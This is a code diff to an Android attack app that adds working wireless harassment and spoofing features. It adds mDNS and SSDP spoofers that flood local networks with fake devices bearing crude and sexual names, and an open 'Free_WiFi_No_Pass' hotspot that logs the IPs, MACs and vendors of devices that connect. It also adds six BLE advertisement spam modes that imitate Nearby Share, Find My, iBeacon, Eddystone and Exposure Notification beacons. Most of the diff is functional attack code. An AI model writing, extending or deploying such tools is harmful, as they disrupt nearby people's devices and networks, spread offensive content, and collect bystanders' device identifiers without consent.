@@ -9,6 +9,7 @@ import android.content.pm.PackageManager;
 import android.graphics.Typeface;
 import android.location.LocationManager;
 import android.net.wifi.WifiConfiguration;
+import android.net.wifi.WifiInfo;
 import android.net.wifi.WifiManager;
 import android.net.wifi.p2p.*;
 import android.os.*;
@@ -16,7 +17,9 @@ import android.text.method.ScrollingMovementMethod;
 import android.view.*;
 import android.widget.*;
 
+import java.io.*;
 import java.lang.reflect.Method;
+import java.net.*;
 import java.util.*;
 
 /**
@@ -48,6 +51,7 @@ public class MainActivity extends android.app.Activity {
     // ── Phone Native Attacks ───────────────────
     private WifiManager wifiManager;
     private volatile boolean isProbeFlood = false, isBtNameTurbo = false;
+    private volatile boolean isMdnsSpoof = false, isSsdpSpoof = false, isHoneypot = false;
     private int probeFloodNetId = -1;
     private BluetoothDevice inspectTarget = null;
 
@@ -284,6 +288,45 @@ public class MainActivity extends android.app.Activity {
         btnLanScan.setLayoutParams(btnParams);
         phoneRow2.addView(btnLanScan);
         content.addView(phoneRow2);
+        
+        // Phone row 3: mDNS + SSDP spoofers
+        LinearLayout phoneRow3 = new LinearLayout(this);
+        phoneRow3.setOrientation(LinearLayout.HORIZONTAL);
+        Button btnMdns = mkBtnWide("🌐 mDNS SPOOF");
+        btnMdns.setOnClickListener(new View.OnClickListener() { public void onClick(View v) {
+            if (isMdnsSpoof) { isMdnsSpoof = false; resetBtn(btnMdns, "🌐 mDNS SPOOF"); log("🛑 mDNS spoofer stopped"); updateStatus("READY"); releaseWakeLock(); }
+            else { if (!wifiConnected()) { log("✕ Connect to WiFi first"); return; }
+                isMdnsSpoof = true; setBtnOn(btnMdns, "🌐 mDNS ON"); log("🌐 mDNS Spoofer ENGAGED — fake AirPlay/Chromecast/printers flooding LAN"); updateStatus("mDNS SPOOF"); acquireWakeLock(); new Thread(new MdnsSpooferRunner()).start(); }
+        }});
+        btnMdns.setLayoutParams(btnParams);
+        phoneRow3.addView(btnMdns);
+        Button btnSsdp = mkBtnWide("📺 SSDP SPOOF");
+        btnSsdp.setOnClickListener(new View.OnClickListener() { public void onClick(View v) {
+            if (isSsdpSpoof) { isSsdpSpoof = false; resetBtn(btnSsdp, "📺 SSDP SPOOF"); log("🛑 SSDP spoofer stopped"); updateStatus("READY"); releaseWakeLock(); }
+            else { if (!wifiConnected()) { log("✕ Connect to WiFi first"); return; }
+                isSsdpSpoof = true; setBtnOn(btnSsdp, "📺 SSDP ON"); log("📺 SSDP Spoofer ENGAGED — fake TVs/routers/printers on Windows Network"); updateStatus("SSDP SPOOF"); acquireWakeLock(); new Thread(new SsdpSpooferRunner()).start(); }
+        }});
+        btnSsdp.setLayoutParams(btnParams);
+        phoneRow3.addView(btnSsdp);
+        content.addView(phoneRow3);
+        
+        // Phone row 4: Hotspot + Export
+        LinearLayout phoneRow4 = new LinearLayout(this);
+        phoneRow4.setOrientation(LinearLayout.HORIZONTAL);
+        Button btnHoneypot = mkBtnWide("📶 HONEYPOT");
+        btnHoneypot.setOnClickListener(new View.OnClickListener() { public void onClick(View v) {
+            if (isHoneypot) { isHoneypot = false; resetBtn(btnHoneypot, "📶 HONEYPOT"); log("🛑 Hotspot stopped"); updateStatus("READY"); releaseWakeLock(); }
+            else { isHoneypot = true; setBtnOn(btnHoneypot, "📶 HOTSPOT ON"); log("📶 WiFi Honeypot ENGAGED — logging curious devices"); updateStatus("HONEYPOT"); acquireWakeLock(); new Thread(new HotspotHoneypotRunner()).start(); }
+        }});
+        btnHoneypot.setLayoutParams(btnParams);
+        phoneRow4.addView(btnHoneypot);
+        Button btnExport = mkBtnWide("📋 EXPORT");
+        btnExport.setOnClickListener(new View.OnClickListener() { public void onClick(View v) {
+            exportScans();
+        }});
+        btnExport.setLayoutParams(btnParams);
+        phoneRow4.addView(btnExport);
+        content.addView(phoneRow4);
 
         // ── Targeted BLE Spam (Flipper-style dropdown) ──
         content.addView(mkLabel("🎯 TARGETED BLE SPAM:", 0xFFFFCC00, 10));
@@ -310,6 +353,12 @@ public class MainActivity extends android.app.Activity {
             "🔄 Handoff Trigger",
             "📶 Tethering Source",
             "📡 WiFi Probe Flood",
+            "📤 Nearby Share",
+            "📍 Eddystone-UID",
+            "🔗 Eddystone-URL",
+            "📍 iBeacon",
+            "🔍 Find My Network",
+            "🦠 Exposure Notify",
         };
         bleModeSpinner = new Spinner(this);
         bleModeAdapter = new ArrayAdapter<>(this, android.R.layout.simple_spinner_dropdown_item, bleModes);
@@ -327,7 +376,7 @@ public class MainActivity extends android.app.Activity {
             if (isBleTargetActive) {
                 isBleTargetActive = false; isCycling = false; stopNetScan = true;
                 resetBtn(btnBleFire, "🔥 FIRE");
-        resetBtn(btnBleCycle, "🔄 CYCLE ALL 21 MODES");
+        resetBtn(btnBleCycle, "🔄 CYCLE ALL 27 MODES");
                 log("🛑 Targeted BLE stopped");
                 updateStatus("READY");
                 releaseWakeLock();
@@ -352,7 +401,7 @@ public class MainActivity extends android.app.Activity {
         btnBleStop.setOnClickListener(new View.OnClickListener() { public void onClick(View v) {
             isBleTargetActive = false; isCycling = false; stopNetScan = true;
             resetBtn(btnBleFire, "🔥 FIRE");
-        resetBtn(btnBleCycle, "🔄 CYCLE ALL 21 MODES");
+        resetBtn(btnBleCycle, "🔄 CYCLE ALL 27 MODES");
             log("🛑 Targeted BLE stopped");
             updateStatus("READY");
             releaseWakeLock();
@@ -362,14 +411,14 @@ public class MainActivity extends android.app.Activity {
         content.addView(bleFireRow);
 
         // Cycle all modes button
-        btnBleCycle = mkBtn("🔄 CYCLE ALL 21 MODES");
+        btnBleCycle = mkBtn("🔄 CYCLE ALL 27 MODES");
         btnBleCycle.setOnClickListener(new View.OnClickListener() { public void onClick(View v) {
             if (!btReady()) return;
             if (isCycling) {
                 isCycling = false; isBleTargetActive = false;
-                resetBtn(btnBleCycle, "🔄 CYCLE ALL 21 MODES");
+                resetBtn(btnBleCycle, "🔄 CYCLE ALL 27 MODES");
                 resetBtn(btnBleFire, "🔥 FIRE");
-        resetBtn(btnBleCycle, "🔄 CYCLE ALL 21 MODES");
+        resetBtn(btnBleCycle, "🔄 CYCLE ALL 27 MODES");
                 log("🛑 Cycle stopped"); updateStatus("READY"); releaseWakeLock();
             } else {
                 isCycling = true; isBleTargetActive = true; currentBleMode = 0;
@@ -843,6 +892,312 @@ public class MainActivity extends android.app.Activity {
     }
 
     // ═══════════════════════════════════════════
+    //  PHONE NATIVE — mDNS SPOOFER
+    // ═══════════════════════════════════════════
+
+    private class MdnsSpooferRunner implements Runnable {
+        public void run() {
+            final String[][] trollDevices = {
+                {"FBI-Surveillance-Van-3.local", "192.168.1.50", "_airplay._tcp.local:_raop._tcp.local"},
+                {"NSA-Listening-Post-7.local", "192.168.1.51", "_printer._tcp.local:_http._tcp.local:_scanner._tcp.local"},
+                {"Samsung-Fridge-5G.local", "192.168.1.52", "_googlecast._tcp.local:_spotify-connect._tcp.local"},
+                {"NOT-A-BOMB.local", "192.168.1.53", "_airport._tcp.local:_tftp._tcp.local"},
+                {"Karens-CCTV-CAM-4.local", "192.168.1.54", "_rtsp._tcp.local:_http._tcp.local"},
+                {"You-Are-Watched.local", "192.168.1.55", "_airplay._tcp.local:_raop._tcp.local:_googlecast._tcp.local"},
+                {"Skynet-Dev-Node.local", "192.168.1.56", "_ssh._tcp.local:_telnet._tcp.local:_ftp._tcp.local"},
+                {"HR-Disciplinary.local", "192.168.1.57", "_smb._tcp.local:_afpovertcp._tcp.local"},
+                {"FREE-OnlyFans-WiFi.local", "192.168.1.58", "_airplay._tcp.local:_googlecast._tcp.local"},
+                {"Mom-Vibrator-Pro.local", "192.168.1.59", "_airplay._tcp.local:_spotify-connect._tcp.local"},
+            };
+            java.util.Random rng = new java.util.Random();
+            java.net.MulticastSocket sock = null;
+            int burst = 0;
+            try {
+                sock = new java.net.MulticastSocket();
+                sock.setTimeToLive(255);
+                final java.net.InetAddress group = java.net.InetAddress.getByName("224.0.0.251");
+                String localIp = getLocalIpStr();
+                while (isMdnsSpoof) {
+                    burst++;
+                    int pick = 2 + rng.nextInt(3); // 2-4 devices per burst
+                    java.util.ArrayList<Integer> idxs = new java.util.ArrayList<>();
+                    while (idxs.size() < pick) { int r = rng.nextInt(trollDevices.length); if (!idxs.contains(r)) idxs.add(r); }
+                    for (int idx : idxs) {
+                        String[] dev = trollDevices[idx];
+                        String[] svcs = dev[2].split(":");
+                        byte[] packet = buildMdnsPacket(dev[0], dev[1], svcs, rng);
+                        java.net.DatagramPacket dp = new java.net.DatagramPacket(packet, packet.length, group, 5353);
+                        for (int s = 0; s < 3; s++) { sock.send(dp); Thread.sleep(80); }
+                        final String name = dev[0];
+                        final int burstNum = burst;
+                        mainHandler.post(new Runnable() { public void run() { log("  🌐 [" + burstNum + "] " + name); }});
+                    }
+                    final int burstNum2 = burst;
+                    mainHandler.post(new Runnable() { public void run() { updateStatus("mDNS #" + burstNum2); }});
+                    Thread.sleep(10000);
+                }
+            } catch (Exception e) {
+                final String msg = e.getMessage();
+                mainHandler.post(new Runnable() { public void run() { log("✕ mDNS: " + msg); }});
+            } finally { if (sock != null) sock.close(); }
+            final int b = burst;
+            mainHandler.post(new Runnable() { public void run() { log("🌐 mDNS stopped — " + b + " bursts"); updateStatus("READY"); }});
+            releaseWakeLock();
+        }
+    }
+
+    // ═══════════════════════════════════════════
+    //  PHONE NATIVE — SSDP SPOOFER
+    // ═══════════════════════════════════════════
+
+    private class SsdpSpooferRunner implements Runnable {
+        public void run() {
+            final String[][] trollDevices = {
+                {"uuid:FBI-Surveillance-Van-3", "upnp:rootdevice", "Linux/2.6 UPnP/1.0 FBI-SVR/1.0", "http://192.168.1.100:5000/root.xml", "FBI Surveillance Van"},
+                {"uuid:Samsung-Fridge-5G", "urn:schemas-upnp-org:device:InternetGatewayDevice:1", "Samsung/1.0 UPnP/1.0", "http://192.168.1.100:8080/desc.xml", "Samsung Fridge 5G"},
+                {"uuid:NSA-Media-Server", "urn:schemas-upnp-org:device:MediaRenderer:1", "NSA-PR/1.0 UPnP/1.0", "http://192.168.1.100:9000/device.xml", "NSA Media Server"},
+                {"uuid:HR-Disciplinary", "urn:schemas-upnp-org:device:Basic:1", "Windows-NT/10.0 UPnP/1.0", "http://192.168.1.100:5357/root.xml", "HR Disciplinary Files"},
+                {"uuid:Karens-CCTV-4", "urn:schemas-upnp-org:device:DigitalSecurityCamera:1", "Hikvision/5.5 UPnP/1.0", "http://192.168.1.100:554/desc.xml", "Karen CCTV #4"},
+                {"uuid:INFECTED-Printer", "urn:schemas-upnp-org:device:Printer:1", "HP-LaserJet/1.0 UPnP/1.0", "http://192.168.1.100:631/root.xml", "INFECTED Printer"},
+                {"uuid:OnlyFans-Router", "urn:schemas-upnp-org:device:WANConnectionDevice:1", "Router/1.0 UPnP/1.0", "http://192.168.1.100:80/device.xml", "OnlyFans WiFi Router"},
+                {"uuid:Skynet-Dev-Node", "urn:schemas-upnp-org:device:MediaServer:1", "Skynet/3.0 UPnP/1.0", "http://192.168.1.100:8200/root.xml", "Skynet Dev Node"},
+                {"uuid:Mom-Vibrator-Pro", "urn:schemas-upnp-org:device:BinaryLight:1", "Lovense/2.0 UPnP/1.0", "http://192.168.1.100:9999/device.xml", "Mom Vibrator Pro"},
+                {"uuid:You-Are-Watched", "urn:schemas-upnp-org:device:MediaRenderer:1", "Panopticon/1.0 UPnP/1.0", "http://192.168.1.100:9090/root.xml", "You Are Watched"},
+            };
+            java.util.Random rng = new java.util.Random();
+            java.net.MulticastSocket sock = null;
+            int burst = 0;
+            try {
+                sock = new java.net.MulticastSocket();
+                sock.setTimeToLive(4);
+                final java.net.InetAddress group = java.net.InetAddress.getByName("239.255.255.250");
+                String localIp = getLocalIpStr();
+                while (isSsdpSpoof) {
+                    burst++;
+                    int pick = 3 + rng.nextInt(3);
+                    java.util.ArrayList<Integer> idxs = new java.util.ArrayList<>();
+                    while (idxs.size() < pick) { int r = rng.nextInt(trollDevices.length); if (!idxs.contains(r)) idxs.add(r); }
+                    for (int idx : idxs) {
+                        String[] dev = trollDevices[idx];
+                        String msg = buildSsdpNotify(dev[0], dev[1], dev[2], dev[3].replace("192.168.1.100", localIp));
+                        byte[] data = msg.getBytes();
+                        java.net.DatagramPacket dp = new java.net.DatagramPacket(data, data.length, group, 1900);
+                        for (int s = 0; s < 2; s++) { sock.send(dp); Thread.sleep(80); }
+                        final String name = dev[4];
+                        final int burstNum = burst;
+                        mainHandler.post(new Runnable() { public void run() { log("  📺 [" + burstNum + "] " + name); }});
+                    }
+                    final int burstNum2 = burst;
+                    mainHandler.post(new Runnable() { public void run() { updateStatus("SSDP #" + burstNum2); }});
+                    Thread.sleep(30000);
+                }
+                // Send byebye for cleanup
+                for (String[] dev : trollDevices) {
+                    String bye = "NOTIFY * HTTP/1.1\r\nHOST: 239.255.255.250:1900\r\nNT: " + dev[1] + "\r\nNTS: ssdp:byebye\r\nUSN: " + dev[0] + "\r\n\r\n";
+                    byte[] bd = bye.getBytes();
+                    java.net.DatagramPacket dp = new java.net.DatagramPacket(bd, bd.length, group, 1900);
+                    sock.send(dp);
+                }
+            } catch (Exception e) {
+                final String msg = e.getMessage();
+                mainHandler.post(new Runnable() { public void run() { log("✕ SSDP: " + msg); }});
+            } finally { if (sock != null) sock.close(); }
+            final int b = burst;
+            mainHandler.post(new Runnable() { public void run() { log("📺 SSDP stopped — " + b + " bursts"); updateStatus("READY"); }});
+            releaseWakeLock();
+        }
+    }
+
+    // ═══════════════════════════════════════════
+    //  PHONE NATIVE — WIFI HONEYPOT
+    // ═══════════════════════════════════════════
+
+    private class HotspotHoneypotRunner implements Runnable {
+        public void run() {
+            try {
+                java.lang.reflect.Method m = wifiManager.getClass().getMethod("setWifiApEnabled", WifiConfiguration.class, boolean.class);
+                WifiConfiguration cfg = new WifiConfiguration();
+                cfg.SSID = "\"Free_WiFi_No_Pass\"";
+                cfg.allowedKeyManagement.set(WifiConfiguration.KeyMgmt.NONE);
+                m.invoke(wifiManager, cfg, true);
+                mainHandler.post(new Runnable() { public void run() {
+                    log("📶 Hotspot ON: \"Free_WiFi_No_Pass\" — open, no password");
+                    log("  Monitoring for curious devices...");
+                }});
+                int prevCount = 0;
+                while (isHoneypot) {
+                    Thread.sleep(5000);
+                    java.io.BufferedReader br = new java.io.BufferedReader(new java.io.FileReader("/proc/net/arp"));
+                    br.readLine(); // skip header
+                    String line;
+                    final java.util.ArrayList<String> clients = new java.util.ArrayList<>();
+                    while ((line = br.readLine()) != null) {
+                        String[] p = line.trim().split("\\s+");
+                        if (p.length >= 4) {
+                            String mac = p[3];
+                            if (!mac.equals("00:00:00:00:00:00") && mac.contains(":")) {
+                                String vendor = getMacVendor(mac);
+                                clients.add(p[0] + " " + mac + (vendor != null ? " [" + vendor + "]" : ""));
+                            }
+                        }
+                    }
+                    br.close();
+                    if (clients.size() != prevCount) {
+                        prevCount = clients.size();
+                        final int c = clients.size();
+                        mainHandler.post(new Runnable() { public void run() {
+                            log("  📶 Hotspot clients: " + c);
+                            for (String cl : clients) log("    " + cl);
+                            updateStatus("HONEYPOT: " + c + " clients");
+                        }});
+                    }
+                }
+                // Cleanup: turn off hotspot
+                m.invoke(wifiManager, cfg, false);
+            } catch (Exception e) {
+                final String msg = e.getMessage();
+                mainHandler.post(new Runnable() { public void run() {
+                    log("✕ Hotspot failed: " + (msg != null ? msg : "API blocked. May need system permissions."));
+                    updateStatus("READY");
+                }});
+            }
+            releaseWakeLock();
+        }
+    }
+
+    // ═══════════════════════════════════════════
+    //  mDNS / SSDP PACKET BUILDERS
+    // ═══════════════════════════════════════════
+
+    private byte[] encodeDnsName(String name) {
+        java.io.ByteArrayOutputStream baos = new java.io.ByteArrayOutputStream();
+        for (String part : name.split("\\.")) {
+            byte[] bytes = part.getBytes();
+            baos.write(bytes.length);
+            try { baos.write(bytes); } catch (Exception e) {}
+        }
+        baos.write(0);
+        return baos.toByteArray();
+    }
+
+    private byte[] buildMdnsPacket(String hostname, String ipAddr, String[] services, java.util.Random rng) {
+        java.io.ByteArrayOutputStream baos = new java.io.ByteArrayOutputStream();
+        try {
+            writeU16(baos, rng.nextInt(0xFFFF));  // TXID
+            writeU16(baos, 0x8400);                // flags: response + authoritative
+            writeU16(baos, 0);                     // questions = 0
+            writeU16(baos, 1 + services.length);  // answers
+            writeU16(baos, 0);                     // authority
+            writeU16(baos, 0);                     // additional
+            // A record
+            byte[] hostEnc = encodeDnsName(hostname);
+            baos.write(hostEnc, 0, hostEnc.length);
+            writeU16(baos, 1);   // type A
+            writeU16(baos, 1);   // class IN
+            writeU32(baos, 120); // TTL
+            writeU16(baos, 4);   // data length
+            for (String p : ipAddr.split("\\.")) baos.write(Integer.parseInt(p));
+            // PTR records for services
+            for (String svc : services) {
+                byte[] svcEnc = encodeDnsName(svc);
+                baos.write(svcEnc, 0, svcEnc.length);
+                writeU16(baos, 12);  // type PTR
+                writeU16(baos, 1);   // class IN
+                writeU32(baos, 120); // TTL
+                byte[] targetEnc = encodeDnsName(hostname);
+                writeU16(baos, targetEnc.length);
+                baos.write(targetEnc, 0, targetEnc.length);
+            }
+        } catch (Exception e) {}
+        return baos.toByteArray();
+    }
+
+    private String buildSsdpNotify(String usn, String nt, String server, String location) {
+        java.util.Random rng = new java.util.Random();
+        return "NOTIFY * HTTP/1.1\r\n" +
+            "HOST: 239.255.255.250:1900\r\n" +
+            "CACHE-CONTROL: max-age=1800\r\n" +
+            "LOCATION: " + location + "\r\n" +
+            "NT: " + nt + "\r\n" +
+            "NTS: ssdp:alive\r\n" +
+            "SERVER: " + server + "\r\n" +
+            "USN: " + usn + "\r\n" +
+            "BOOTID.UPNP.ORG: " + rng.nextInt(9999) + "\r\n" +
+            "CONFIGID.UPNP.ORG: " + rng.nextInt(99999) + "\r\n" +
+            "\r\n";
+    }
+
+    private void writeU16(java.io.ByteArrayOutputStream baos, int v) {
+        baos.write((v >> 8) & 0xFF);
+        baos.write(v & 0xFF);
+    }
+
+    private void writeU32(java.io.ByteArrayOutputStream baos, long v) {
+        baos.write((int)((v >> 24) & 0xFF));
+        baos.write((int)((v >> 16) & 0xFF));
+        baos.write((int)((v >> 8) & 0xFF));
+        baos.write((int)(v & 0xFF));
+    }
+
+    // ═══════════════════════════════════════════
+    //  EXPORT SCANS
+    // ═══════════════════════════════════════════
+
+    private void exportScans() {
+        final java.util.ArrayList<BluetoothDevice> devs;
+        synchronized (discoveredDevices) { devs = new java.util.ArrayList<>(discoveredDevices); }
+        if (devs.isEmpty()) { log("✕ No devices to export. Scan first."); return; }
+        new Thread(new Runnable() { public void run() {
+            try {
+                java.io.File outFile = new java.io.File(android.os.Environment.getExternalStoragePublicDirectory(
+                    android.os.Environment.DIRECTORY_DOWNLOADS), "obliterate_scan.json");
+                java.io.FileWriter fw = new java.io.FileWriter(outFile);
+                fw.write("{\n  \"timestamp\": \"" + new java.util.Date() + "\",\n");
+                fw.write("  \"device_count\": " + devs.size() + ",\n");
+                fw.write("  \"devices\": [\n");
+                for (int i = 0; i < devs.size(); i++) {
+                    BluetoothDevice d = devs.get(i);
+                    String name = getName(d).replace("\"", "\\\"");
+                    fw.write("    {\n");
+                    fw.write("      \"name\": \"" + name + "\",\n");
+                    fw.write("      \"address\": \"" + d.getAddress() + "\",\n");
+                    fw.write("      \"type\": \"" + (d.getType() == BluetoothDevice.DEVICE_TYPE_CLASSIC ? "classic" : d.getType() == BluetoothDevice.DEVICE_TYPE_LE ? "ble" : "dual") + "\",\n");
+                    fw.write("      \"bond_state\": " + d.getBondState() + "\n");
+                    fw.write("    }" + (i < devs.size() - 1 ? "," : "") + "\n");
+                }
+                fw.write("  ]\n}\n");
+                fw.close();
+                final String path = outFile.getAbsolutePath();
+                mainHandler.post(new Runnable() { public void run() {
+                    log("📋 Exported " + devs.size() + " devices → " + path);
+                    updateStatus("READY");
+                }});
+            } catch (Exception e) {
+                final String msg = e.getMessage();
+                mainHandler.post(new Runnable() { public void run() {
+                    log("✕ Export failed: " + msg);
+                    updateStatus("READY");
+                }});
+            }
+        }}).start();
+        log("📋 Exporting " + devs.size() + " devices...");
+    }
+
+    private boolean wifiConnected() {
+        try {
+            WifiInfo info = wifiManager.getConnectionInfo();
+            return info != null && info.getNetworkId() != -1;
+        } catch (Exception e) { return false; }
+    }
+
+    private String getLocalIpStr() {
+        try {
+            int ip = wifiManager.getConnectionInfo().getIpAddress();
+            return (ip & 0xFF) + "." + ((ip >> 8) & 0xFF) + "." + ((ip >> 16) & 0xFF) + "." + ((ip >> 24) & 0xFF);
+        } catch (Exception e) { return "192.168.1.80"; }
+    }
+
+    // ═══════════════════════════════════════════
     //  BT PAIRING SPAM
     // ═══════════════════════════════════════════
 
@@ -989,7 +1344,7 @@ public class MainActivity extends android.app.Activity {
             .setConnectable(false).setTimeout(0).build();
         AdvertiseData d = null;
         String name = spoofNameInput.getText().toString();
-        if (isCycling) { String[] modeNames = {"🪟 Swift Pair","🤖 Fast Devices","🤖 Fast Debug","🤖 Fast NonProd","🤖 Fast Phone","🍎 Apple NewDev","🍎 Apple Action","🍎 iOS17CRASH","🍎 Apple AirTag","🍎 Apple NotYours","⭐ Samsung Buds","⭐ Samsung Watch","💗 LoveSpouse Play","💗 LoveSpouse Stop","😴 AirSense CPAP","📛 Settings Flood","🔥 Aggressive","📁 AirDrop","🔄 Handoff","📶 Tethering","📡 WiFi Probe"}; log("  ↻ ["+(mode+1)+"/15] "+modeNames[mode]); updateStatus("CYCLING: "+modeNames[mode]); }
+        if (isCycling) { String[] modeNames = {"🪟 Swift Pair","🤖 Fast Devices","🤖 Fast Debug","🤖 Fast NonProd","🤖 Fast Phone","🍎 Apple NewDev","🍎 Apple Action","🍎 iOS17CRASH","🍎 Apple AirTag","🍎 Apple NotYours","⭐ Samsung Buds","⭐ Samsung Watch","💗 LoveSpouse Play","💗 LoveSpouse Stop","😴 AirSense CPAP","📛 Settings Flood","🔥 Aggressive","📁 AirDrop","🔄 Handoff","📶 Tethering","📡 WiFi Probe","📤 NearbyShare","📍 EddyUID","🔗 EddyURL","📍 iBeacon","🔍 FindMy","🦠 ExpoNotify"}; log("  ↻ ["+(mode+1)+"/27] "+modeNames[mode]); updateStatus("CYCLING: "+modeNames[mode]); }
         try {
         switch (mode) {
         case 0: { log("🪟 Swift Pair"); byte[] sp = new byte[3 + name.length()]; sp[0]=0x03; sp[1]=0x00; sp[2]=(byte)0x80; System.arraycopy(name.getBytes(),0,sp,3,name.length()); d = new AdvertiseData.Builder().setIncludeDeviceName(false).addManufacturerData(0x0006,sp).build(); break; }
@@ -1062,14 +1417,60 @@ public class MainActivity extends android.app.Activity {
                 .addManufacturerData(0x038D, new byte[]{0x00}).build();
             // Also set device name in scan response
             break; }
+        case 21: { // Nearby Share
+            byte[] ns = new byte[20];
+            for (int ni = 0; ni < 20; ni++) ns[ni] = (byte)(Math.random()*256);
+            d = new AdvertiseData.Builder().setIncludeDeviceName(false)
+                .addServiceUuid(ParcelUuid.fromString("0000FC8E-0000-1000-8000-00805F9B34FB"))
+                .addServiceData(ParcelUuid.fromString("0000FC8E-0000-1000-8000-00805F9B34FB"), ns).build();
+            break; }
+        case 22: { // Eddystone-UID
+            byte[] eddy = new byte[20];
+            eddy[0] = 0x00; eddy[1] = (byte)(-41 + (int)(Math.random()*82));
+            for (int ei = 2; ei < 20; ei++) eddy[ei] = (byte)(Math.random()*256);
+            d = new AdvertiseData.Builder().setIncludeDeviceName(false)
+                .addServiceUuid(ParcelUuid.fromString("0000FEAA-0000-1000-8000-00805F9B34FB"))
+                .addServiceData(ParcelUuid.fromString("0000FEAA-0000-1000-8000-00805F9B34FB"), eddy).build();
+            break; }
+        case 23: { // Eddystone-URL
+            byte[] eddyUrl = new byte[10];
+            eddyUrl[0] = 0x10; eddyUrl[1] = (byte)(-41 + (int)(Math.random()*82));
+            eddyUrl[2] = 0x00;
+            for (int ei = 3; ei < 10; ei++) eddyUrl[ei] = (byte)(Math.random()*26 + 'a');
+            d = new AdvertiseData.Builder().setIncludeDeviceName(false)
+                .addServiceUuid(ParcelUuid.fromString("0000FEAA-0000-1000-8000-00805F9B34FB"))
+                .addServiceData(ParcelUuid.fromString("0000FEAA-0000-1000-8000-00805F9B34FB"), eddyUrl).build();
+            break; }
+        case 24: { // iBeacon
+            byte[] ib = new byte[23];
+            ib[0] = 0x02; ib[1] = 0x15;
+            for (int ii = 2; ii < 23; ii++) ib[ii] = (byte)(Math.random()*256);
+            d = new AdvertiseData.Builder().setIncludeDeviceName(false)
+                .addManufacturerData(0x004C, ib).build();
+            break; }
+        case 25: { // Find My Network
+            byte[] fm = new byte[24];
+            fm[0] = 0x07; fm[1] = 0x19;
+            for (int fi = 2; fi < 24; fi++) fm[fi] = (byte)(Math.random()*256);
+            fm[6] = (byte)(Math.random()*100); fm[7] = (byte)(Math.random()*100);
+            d = new AdvertiseData.Builder().setIncludeDeviceName(false)
+                .addManufacturerData(0x004C, fm).build();
+            break; }
+        case 26: { // Exposure Notification
+            byte[] en = new byte[20];
+            for (int ei = 0; ei < 20; ei++) en[ei] = (byte)(Math.random()*256);
+            d = new AdvertiseData.Builder().setIncludeDeviceName(false)
+                .addServiceUuid(ParcelUuid.fromString("0000FD6F-0000-1000-8000-00805F9B34FB"))
+                .addServiceData(ParcelUuid.fromString("0000FD6F-0000-1000-8000-00805F9B34FB"), en).build();
+            break; }
         default: return;
         }
         BleFireCb cb = new BleFireCb();
         adv.startAdvertising(s, d, cb);
         final int delay = (currentBleMode == 16) ? 200 : 2000;
-        mainHandler.postDelayed(new Runnable() { public void run() { try { BluetoothLeAdvertiser a = btAdapter.getBluetoothLeAdvertiser(); if (a != null) a.stopAdvertising(cb); } catch (Exception e) {} if (isBleTargetActive) { if (isCycling) { currentBleMode = (currentBleMode + 1) % 21; } fireTargetedBle(); } }}, delay);
-        } catch (SecurityException e) { log("✕ Permission: BLUETOOTH_ADVERTISE"); if (isCycling) { isCycling = false; isBleTargetActive = false; resetBtn(btnBleCycle, "🔄 CYCLE ALL 21 MODES"); log("🛑 Cycle halted — grant BLE advertise permission"); } else { isBleTargetActive = false; } resetBtn(btnBleFire, "🔥 FIRE"); }
-          catch (Exception e) { log("✕ BLE: " + e.getMessage()); if (isBleTargetActive) { if (isCycling) { currentBleMode = (currentBleMode + 1) % 21; log("  ↻ Skipping mode, cycling to next..."); } mainHandler.postDelayed(new Runnable() { public void run() { fireTargetedBle(); }}, 500); } }
+        mainHandler.postDelayed(new Runnable() { public void run() { try { BluetoothLeAdvertiser a = btAdapter.getBluetoothLeAdvertiser(); if (a != null) a.stopAdvertising(cb); } catch (Exception e) {} if (isBleTargetActive) { if (isCycling) { currentBleMode = (currentBleMode + 1) % 27; } fireTargetedBle(); } }}, delay);
+        } catch (SecurityException e) { log("✕ Permission: BLUETOOTH_ADVERTISE"); if (isCycling) { isCycling = false; isBleTargetActive = false; resetBtn(btnBleCycle, "🔄 CYCLE ALL 27 MODES"); log("🛑 Cycle halted — grant BLE advertise permission"); } else { isBleTargetActive = false; } resetBtn(btnBleFire, "🔥 FIRE"); }
+          catch (Exception e) { log("✕ BLE: " + e.getMessage()); if (isBleTargetActive) { if (isCycling) { currentBleMode = (currentBleMode + 1) % 27; log("  ↻ Skipping mode, cycling to next..."); } mainHandler.postDelayed(new Runnable() { public void run() { fireTargetedBle(); }}, 500); } }
     }
 
     private class BleFireCb extends AdvertiseCallback {
@@ -1182,6 +1583,7 @@ public class MainActivity extends android.app.Activity {
         isDiscSpam = false; isPairSpam = false; isConnSpam = false; isBleSpam = false; isWifiSpam = false;
         isBleTargetActive = false; isCycling = false; stopNetScan = true;
         isProbeFlood = false; isBtNameTurbo = false;
+        isMdnsSpoof = false; isSsdpSpoof = false; isHoneypot = false;
         if (btAdapter != null && btAdapter.isDiscovering()) btAdapter.cancelDiscovery();
         if (leScanner != null && activeBleScanCb != null) try { leScanner.stopScan(activeBleScanCb); } catch (Exception e) {}
         if (wifiP2pManager != null && wifiChannel != null)
@@ -1192,7 +1594,7 @@ public class MainActivity extends android.app.Activity {
         resetBtn(btnBleSpam, "📶 BLE SPAM");
         resetBtn(btnWifiSpam, "📡 WIFI DIRECT SPAM");
         resetBtn(btnBleFire, "🔥 FIRE");
-        resetBtn(btnBleCycle, "🔄 CYCLE ALL 21 MODES");
+        resetBtn(btnBleCycle, "🔄 CYCLE ALL 27 MODES");
         releaseWakeLock(); updateStatus("READY");
         log("🛑 ALL ATTACKS STOPPED");
     }
@@ -1545,7 +1947,8 @@ public class MainActivity extends android.app.Activity {
 
     private void releaseWakeLock() {
         if (!isDiscSpam && !isPairSpam && !isConnSpam && !isBleSpam && !isWifiSpam
-            && !isBleTargetActive && !isCycling && !isProbeFlood && !isBtNameTurbo)
+            && !isBleTargetActive && !isCycling && !isProbeFlood && !isBtNameTurbo
+            && !isMdnsSpoof && !isSsdpSpoof && !isHoneypot)
             if (wakeLock != null && wakeLock.isHeld()) wakeLock.release();
     }
 
